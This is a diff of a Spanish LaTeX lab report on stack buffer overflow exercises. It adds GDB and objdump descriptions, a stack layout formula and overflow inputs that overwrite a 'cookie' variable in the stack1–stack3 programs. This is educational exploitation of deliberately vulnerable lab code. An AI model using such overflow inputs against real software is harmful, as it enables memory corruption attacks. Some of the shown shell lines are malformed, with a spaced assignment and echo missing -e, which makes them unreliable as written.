@@ -6,6 +6,10 @@
 \usepackage[utf8x]{inputenc}
 \usepackage{amsmath}
 
+\usepackage{mathtools}
+\DeclarePairedDelimiter\ceil{\lceil}{\rceil}
+\DeclarePairedDelimiter\floor{\lfloor}{\rfloor}
+
 \usepackage{bookman}
 \usepackage{booktabs}
 \usepackage[pdfborder={0 0 0}]{hyperref}
@@ -114,19 +118,12 @@ $ gcc -g stack{i}.c -o stack{i}.o
 \subsection{Herramientas utilizadas}
 \subsubsection{GDB}
 
-Poner alguna fruta:
+GDB (Gnu Project Debugger) es una herramienta que permite entre otras cosas, correr el programa con la posibilidad de detenerlo cuando se cumple cierta condición, avanzar paso a paso y, entre otras cosas, analizar el stack frame actual de cada uno de ellos.
 
-\begin{verbatim}
-$ gdb stack1.o
-\end{verbatim}
 
 \subsubsection{Objdump}
 
-Alguna fruta más:
-
-\begin{verbatim}
-$ objdump -d stack{i}.o
-\end{verbatim}
+Objdump es una herramienta muy util que despliega información sobre uno o más archivos objecto de manera que os permite ver el codigo assembler en ellos.
 
 \newpage
 \section{Programas}
@@ -134,30 +131,94 @@ $ objdump -d stack{i}.o
 \lstset{ language = C, numbers=left, tabsize=4, breaklines=true, frame=single }
 \lstinputlisting{./stack1.c}
 
-\bigskip
-El buffer ocupa el espacio de 80 char, lo que corresponde a 20 words en el stack que se corresponden con el rango [24(sp), 103(sp)]
+\subsubsection{Descripción}
 
-Al ser \textbf{fgets()} una función insegura y estando cookie y más fruta...
+\bigskip
+Mediante gdb podemos ver que la disposición del stack frame para este programa es el siguiente
 
 \bigskip
 
 \begin{figure}[h!]
 	\centering
 	\includegraphics[scale=0.7]{./recursos/stack1.png}
-	\caption{Gr\'afico del speedup entre Bubblsort en C y Quicksort en C}
+	\caption{Gr\'afico del stack del programa stack1}
+    \label{fig:stack1}
 \end{figure}
 
 
+\bigskip
+Lo que nos dice que las posiciones del array del buffer siguen la disposición:
 
+\begin{equation*}
+\forall x \in [0,n], \quad \&buff[x]=sp(24+ 4 * \floor*{\frac{x}{4}})
+\end{equation*}
+
+
+\subsubsection{Solución}
+
+Al crecer las posiciones del array hacia arriba en el stack lo único que debemos hacer es escribir el buffer en la posición x=80  para que la última word coincida con la posición de memoria de cookie, en la posición 104(sp), y luego hacer que corresponda con el hexadecimal 0x41424344 que es el codigo ascci correspondiente al texto ABCD.
+\bigskip
+Una manera de comprobar esto es ejecutar las siguientes lineas en una consola:
+
+\begin{lstlisting}
+input = 0000000000000000000000000000000000000000
+0000000000000000000000000000000000000000DCBA
+echo $input | ./stack1.o
+\end{lstlisting}
+
+O escapeando y en hexadecimal:
+
+\begin{lstlisting}
+input = 0000000000000000000000000000000000000000
+0000000000000000000000000000000000000000\x44\x43\x42\x41
+echo -e $input | ./stack1.o
+\end{lstlisting}
+
+\bigskip
+
+Lo que en ambos casos resultará en el output: "you win!"
 
 
 \subsection{stack2}
 \lstset{ language = C, numbers=left, tabsize=4, breaklines=true, frame=single }
 \lstinputlisting{./stack2.c}
 
+\subsubsection{Descripción}
+
+El stack será el mismo que el de la figura \textbf{(\ref{fig:stack1})}. La diferencia en este programa es que no inicializamos con un valor a cookie, pero al tener que sobreeescribirlo nos es indistinto.
+
+\subsubsection{Solución}
+
+En este caso el hexadecimal que queremos que esté en la posición sp(104) es el 0x01020305, por lo tanto una posible solución es:
+
+\begin{lstlisting}
+input = 0000000000000000000000000000000000000000
+0000000000000000000000000000000000000000\x05\x03\x02\x01
+echo $input | ./stack2.o
+\end{lstlisting}
+\bigskip
+
+Lo que resultará en el output: "you win!"
+
 \subsection{stack3}
 \lstset{ language = C, numbers=left, tabsize=4, breaklines=true, frame=single }
 \lstinputlisting{./stack3.c}
+
+\subsubsection{Descripción}
+Al igual que en los casos anteriores, el stack será el mismo que el de la figura \textbf{(\ref{fig:stack1})}.
+\subsubsection{Solución}
+
+El hexadecimal a escribir en esta caso es 0x01020005, de manera que una posible solución será:
+
+\begin{lstlisting}
+input = 0000000000000000000000000000000000000000
+0000000000000000000000000000000000000000\x05\x00\x02\x01
+echo $input | ./stack3.o
+\end{lstlisting}
+
+\bigskip
+
+Lo que resultará en el output: "you win!"
 
 \subsection{stack4}
 \lstset{ language = C, numbers=left, tabsize=4, breaklines=true, frame=single }
@@ -176,6 +237,8 @@ Al ser \textbf{fgets()} una función insegura y estando cookie y más fruta...
 
 \lstset{ language = C, numbers=left, tabsize=4, breaklines=true, frame=single }
 \lstinputlisting{./win.c}
+
+\section{Conclusión}
 
 
 
